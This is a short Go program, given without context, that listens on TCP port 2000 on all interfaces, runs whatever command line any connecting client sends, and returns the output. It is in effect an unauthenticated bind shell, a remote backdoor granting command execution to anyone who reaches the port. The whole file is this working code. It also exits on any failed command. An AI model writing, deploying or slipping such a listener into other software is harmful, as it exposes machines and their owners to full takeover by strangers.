package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {
	// Listen on TCP port 2000 on all available unicast and
	// anycast IP addresses of the local system.
	l, err := net.Listen("tcp", ":2000")
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()

	connList := make(chan *net.Conn)
	go func() {
		fmt.Println("in conn list goroutine")
		for {
			conn := <-connList

			go func(c *net.Conn) {
				fmt.Println("in conn goroutine")

				for {
					fmt.Println("waiting commands")

					buf, err := bufio.NewReader(*c).ReadString('\n')
					if err != nil {
						fmt.Println("read commands failed")
						log.Fatal(err)
					}

					buf = strings.Trim(buf, " \r\n")
					fmt.Printf("command : %s\n", buf)

					if len(buf) == 0 {
						continue
					} else if buf == "quit" {
						break
					} else {
						cmds := strings.Split(buf, " ")
						out, err := exec.Command(cmds[0], cmds[1:]...).Output()
						if err != nil {
							log.Fatal(err)
						}
						fmt.Printf("output : %s\n", out)
						io.Copy(*c, strings.NewReader(string(out)))
					}
				}
				(*c).Close()
			}(conn)
		}
	}()

	for {
		// Wait for a connection.
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		connList <- &conn
	}
}
